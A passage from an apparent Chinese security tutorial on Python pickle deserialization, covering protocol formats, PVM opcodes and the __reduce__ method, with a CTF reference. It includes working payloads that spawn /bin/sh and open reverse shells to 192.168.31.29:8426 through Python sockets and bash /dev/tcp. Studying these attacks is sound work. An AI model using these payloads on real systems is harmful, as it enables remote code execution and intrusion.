&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># python3输出 protocol&amp;lt;=5&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># python2输出 protocal&amp;lt;=2&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">p1&lt;/span>
&lt;span style="color:#111">I1&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#111">p2&lt;/span>
&lt;span style="color:#111">I2&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">�&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>使用**&lt;u>pickletools&lt;/u>**可以将opcode转化为肉眼可读取的形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="可以利用的方向思路">可以利用的方向&amp;amp;思路&lt;/h2>
&lt;p>pickle的应用场景其实很广泛&lt;/p>
&lt;ul>
&lt;li>解析认证token, session时；参见：&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">掌阅iReader某站Python漏洞挖掘&lt;/a>（一个redis+python反序列化的栗子&lt;/li>
&lt;li>可能将对象pickle后存储成磁盘文件&lt;/li>
&lt;li>可能将对象pickle后在网络中传输&lt;/li>
&lt;li>可能会通过参数传递给程序；参见：&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmap的代码执行漏洞&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。&lt;/p>
&lt;p>构造反序列化的payload离不开&lt;code>__reduce__&lt;/code>这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>）&lt;/p>
&lt;p>————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3中消除了两者的区别，表现为第二种&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>回到关于&lt;code>__reduce__&lt;/code>的问题，只要在新式类中定义一个 &lt;code>__reduce__&lt;/code> 方法，我们就能在序列化的使用让这个类根据我们在&lt;code>__reduce__&lt;/code> 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个&lt;code>callable&lt;/code>可调用的对象，一个是&lt;code> ([para1, para2, ...])[, ...])&lt;/code>，该对象所需的参数元组；最简单的例子是&lt;code>return (os.system, ('ls',))&lt;/code>。&lt;code>__reduce__&lt;/code> 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是&lt;code>__reduce__&lt;/code>的返回值的一个底层实现。&lt;/p>
&lt;h3 id="此处上一个简单的小栗子">此处上一个简单的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在&lt;code>__reduce__&lt;/code>中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的&lt;code>__reduce__&lt;/code>函数的返回值，我们可以利用它来rce，反弹shell之类的。&lt;/p>
&lt;h3 id="另一个反弹shell的小栗子">另一个反弹shell的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 或者最简单的手写opcode 不用特意构造class A()&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>参考：&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">之前写过了&lt;/a>，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行&lt;/p>
&lt;/details>
&lt;h3 id="用marshal序列化任意代码对象">用Marshal序列化任意代码对象&lt;/h3>
&lt;p>如果只在&lt;code>__reduce__&lt;/code>中用&lt;code>-c&lt;/code>参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦&lt;/p>
&lt;p>前面提到pickle不能序列化代码对象，来个实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
